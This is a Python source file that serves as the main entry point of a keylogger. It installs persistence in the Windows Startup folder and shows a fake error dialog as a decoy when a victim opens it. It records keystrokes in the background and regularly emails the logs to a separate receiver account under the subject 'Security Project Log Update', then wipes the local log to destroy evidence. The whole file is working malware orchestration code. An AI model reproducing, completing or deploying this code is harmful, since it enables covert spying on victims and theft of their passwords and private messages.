"""
Module: Main Entry Point
Description: Orchestrates the keylogger, network modules, and system persistence.
"""

import os
import threading
import time
import config
from keylogger import Keylogger
from email_service import EmailService
import deployment # Import the new module

def start_exfiltration_loop():
    """
    Background logic: Reads logs, sends via Mail1->Mail2, and wipes evidence.
    """
    # Initialize the Service with raw logs sender mail
    mailer = EmailService(config.RAW_LOG_SENDER, config.RAW_LOG_PASSWORD)
    
    while True:
        time.sleep(config.SEND_REPORT_EVERY)
        
        # Read log
        log_path = config.LOG_FILE
        if not os.path.exists(log_path):
            continue
            
        with open(log_path, "r", encoding="utf-8") as file:
            content = file.read()
            
        if content:
            # Send (Mail 1 -> Mail 2)
            print("[*] Sending logs...")
            success = mailer.send_email(
                receiver_email=config.RAW_LOG_RECEIVER,
                subject="Security Project Log Update",
                body=content
            )
            
            # Wipe Evidence (Only if sent successfully)
            if success:
                with open(log_path, "w", encoding="utf-8") as file:
                    file.write("")

def main():
    
    if not deployment.is_running_from_startup():
        # SCENARIO: USER CLICKED THE FILE (USB/Desktop)
        # We only want to show the error and install persistence 
        
        deployment.install_persistence()
        
        # Show Decoy Error 
        # We run this in a thread so the keylogger starts immediately
        error_thread = threading.Thread(target=deployment.show_fake_error)
        error_thread.start()
        
    else:
        # SCENARIO: AUTOMATIC RESTART
        # We are already in the Startup folder.
        # Don't show the error. Be completely silent.
        pass


# Start Keylogger
    logger = Keylogger()
    logger_thread = threading.Thread(target=logger.start)
    logger_thread.start()
    
    # Start Exfiltration 
    exfil_thread = threading.Thread(target=start_exfiltration_loop, daemon=True)
    exfil_thread.start()
    
    # Keep main thread alive
    logger_thread.join()

if __name__ == "__main__":
    main()